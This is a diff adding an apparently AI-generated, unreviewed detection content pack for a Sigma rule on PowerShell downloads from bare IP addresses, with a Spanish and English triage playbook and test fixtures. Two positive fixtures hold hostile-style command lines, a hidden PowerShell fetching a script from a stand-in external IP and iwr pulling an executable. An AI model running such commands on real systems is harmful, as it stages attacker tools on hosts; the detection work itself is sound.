@@ -1,0 +1,132 @@
+{
+  "rule": {
+    "id": "1edff897-9146-48d2-9066-52e8d8f80a2f",
+    "title": "Suspicious Invoke-WebRequest Execution With DirectIP",
+    "level": "medium",
+    "status": "test",
+    "author": "Nasreddine Bencherchali (Nextron Systems)",
+    "path": "windows/process_creation/proc_creation_win_powershell_invoke_webrequest_direct_ip.yml",
+    "url": "https://github.com/SigmaHQ/sigma/blob/05d1031f537e830b76da53bae2400c5814c89165/rules/windows/process_creation/proc_creation_win_powershell_invoke_webrequest_direct_ip.yml",
+    "license": "DRL-1.1",
+    "techniques": [
+      "T1105"
+    ]
+  },
+  "playbook": {
+    "es": {
+      "summary": "PowerShell ejecutó un cmdlet o alias de descarga (Invoke-WebRequest, Invoke-RestMethod, iwr, irm, curl, wget) contra una URL con dirección IP directa en lugar de un nombre de host. Suele indicar la descarga de un payload desde infraestructura atacante.",
+      "what_it_detects": "Eventos de creación de procesos donde Image u OriginalFileName es powershell.exe, powershell_ise.exe o pwsh, y CommandLine contiene un cmdlet o alias de descarga y un esquema de URL seguido de un dígito 1-9 (por ejemplo http://203.0.113.45/).",
+      "why_it_matters": "Descargar herramientas o scripts directamente desde una IP es habitual tras explotar servicios expuestos, como servidores de gestión de impresión. Corresponde a ATT&CK T1105 Ingress Tool Transfer y suele preceder ejecución, persistencia o movimiento lateral.",
+      "triage_steps": [
+        "Lea el CommandLine completo: anote IP, puerto, ruta, archivo de salida (-OutFile) y si el contenido se canaliza a IEX u otro método de ejecución.",
+        "Determine si la IP es interna (10.x, 172.16-31.x, 192.168.x) o externa y consúltela en threat intelligence y en logs de proxy o firewall.",
+        "Revise ParentImage y la línea de comandos del padre. Un servidor web, servicio de impresión, Office o script host como padre es muy sospechoso.",
+        "Identifique el usuario y la sesión. Confirme si esa cuenta suele ejecutar PowerShell en este equipo.",
+        "Pivote en el mismo host +/- 15 minutos: procesos hijos, archivos nuevos en la ruta de descarga, conexiones de red, servicios o tareas programadas nuevas.",
+        "Busque la misma IP o URL en todos los endpoints y en alertas anteriores para medir el alcance.",
+        "Si se escribió un archivo, obtenga su hash y verifique su reputación; no lo ejecute fuera de un sandbox."
+      ],
+      "false_positives": [
+        "Scripts de administración o despliegue que descargan paquetes desde servidores internos por IP privada.",
+        "Scripts de monitoreo o health checks que consultan APIs REST de appliances por IP.",
+        "Entornos de laboratorio, desarrollo o pruebas sin nombres DNS."
+      ],
+      "response_steps": [
+        "Verifique con el responsable del equipo o los registros de cambios si la descarga era esperada.",
+        "Si es maliciosa, aísle el endpoint y bloquee la IP y la URL en proxy y firewall.",
+        "Tras preservar evidencia y hashes, termine los procesos relacionados y elimine archivos descargados y persistencia.",
+        "Restablezca las credenciales de la cuenta involucrada y parchee el servicio que lanzó PowerShell si fue explotado.",
+        "Agregue filtros para IP internas legítimas confirmadas y así reducir ruido."
+      ],
+      "severity_rationale": "Media es adecuada porque las descargas por IP directa con PowerShell son sospechosas, pero scripts internos generan el mismo patrón y se requiere contexto antes de escalar."
+    },
+    "en": {
+      "summary": "PowerShell ran a web download cmdlet or alias (Invoke-WebRequest, Invoke-RestMethod, iwr, irm, curl, wget) against a URL that uses a bare IP address instead of a hostname. This often means a payload is being pulled from attacker infrastructure.",
+      "what_it_detects": "Process creation events where Image or OriginalFileName is powershell.exe, powershell_ise.exe or pwsh, and CommandLine contains both a download cmdlet or alias and a URL scheme followed by a digit 1-9 (for example http://203.0.113.45/).",
+      "why_it_matters": "Downloading tools or scripts straight from an IP address is common after exploitation of exposed services such as print management servers. It maps to ATT&CK T1105 Ingress Tool Transfer and often precedes execution, persistence or lateral movement.",
+      "triage_steps": [
+        "Read the full CommandLine: note the IP, port, path, output file (-OutFile) and whether the content is piped to IEX or another execution method.",
+        "Check whether the IP is internal (10.x, 172.16-31.x, 192.168.x) or external, and look it up in threat intelligence and proxy or firewall logs.",
+        "Review ParentImage and the parent command line. A web server, print service, Office app or script host as parent is highly suspicious.",
+        "Identify the user and logon session. Confirm whether that account normally runs PowerShell on this host.",
+        "Pivot on the same host within +/- 15 minutes for child processes, new files in the download path, network connections and new services or scheduled tasks.",
+        "Search for the same IP or URL across all endpoints and earlier alerts to measure scope.",
+        "If a file was written, collect its hash and check reputation; do not run it outside a sandbox."
+      ],
+      "false_positives": [
+        "Admin or deployment scripts that pull packages from internal servers addressed by private IP.",
+        "Health checks or monitoring scripts that query REST APIs on appliances by IP.",
+        "Lab, developer or test environments where services lack DNS names."
+      ],
+      "response_steps": [
+        "Verify with the host owner or change records whether the download was expected.",
+        "If malicious, isolate the endpoint and block the IP and URL at the proxy and firewall.",
+        "Kill related processes, remove downloaded files and any persistence after preserving evidence and hashes.",
+        "Reset credentials of the involved account and patch the service that spawned PowerShell if exploited.",
+        "Add tuned filters for confirmed legitimate internal IPs to reduce noise."
+      ],
+      "severity_rationale": "Medium fits because direct-IP downloads by PowerShell are suspicious but internal scripts can produce the same pattern, so context is needed before escalation."
+    }
+  },
+  "fixtures": {
+    "positive": [
+      {
+        "description": "powershell.exe spawned by a print service downloads a script from an external IP with Invoke-WebRequest",
+        "event": {
+          "EventID": 1,
+          "Computer": "PRINT-SRV-01",
+          "User": "NT AUTHORITY\\SYSTEM",
+          "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "OriginalFileName": "PowerShell.EXE",
+          "CommandLine": "powershell.exe -nop -w hidden -c Invoke-WebRequest -Uri http://203.0.113.45/a.ps1 -OutFile C:\\Windows\\Temp\\a.ps1",
+          "ParentImage": "C:\\Program Files\\PaperCut MF\\runtime\\win64\\jre\\bin\\java.exe"
+        }
+      },
+      {
+        "description": "pwsh.exe uses the iwr alias against a direct IP with a custom port",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142",
+          "User": "ANDES\\jperez",
+          "Image": "C:\\Program Files\\PowerShell\\7\\pwsh.exe",
+          "OriginalFileName": "pwsh.dll",
+          "CommandLine": "pwsh.exe -c iwr http://198.51.100.7:8080/tool.exe -OutFile $env:TEMP\\tool.exe",
+          "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+        }
+      }
+    ],
+    "negative": [
+      {
+        "description": "PowerShell Invoke-WebRequest to a hostname, not a direct IP",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142",
+          "User": "ANDES\\jperez",
+          "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "OriginalFileName": "PowerShell.EXE",
+          "CommandLine": "powershell.exe -c Invoke-WebRequest -Uri https://updates.example.com/agent.msi -OutFile C:\\Temp\\agent.msi",
+          "ParentImage": "C:\\Windows\\explorer.exe"
+        }
+      },
+      {
+        "description": "Native curl.exe (not PowerShell) downloading from a direct IP",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142",
+          "User": "ANDES\\jperez",
+          "Image": "C:\\Windows\\System32\\curl.exe",
+          "OriginalFileName": "curl.exe",
+          "CommandLine": "curl.exe -o C:\\Temp\\file.zip http://192.0.2.10/file.zip",
+          "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+        }
+      }
+    ]
+  },
+  "generated": {
+    "tool": "content-pack/1",
+    "model": "claude-opus-5-5",
+    "at": "2026-10-26T02:47:30+00:00",
+    "review": "unreviewed",
+    "notice": "AI-generated content. Review it before relying on it. Fixtures are validated by Centinela's engine in session S7."
+  }
+}
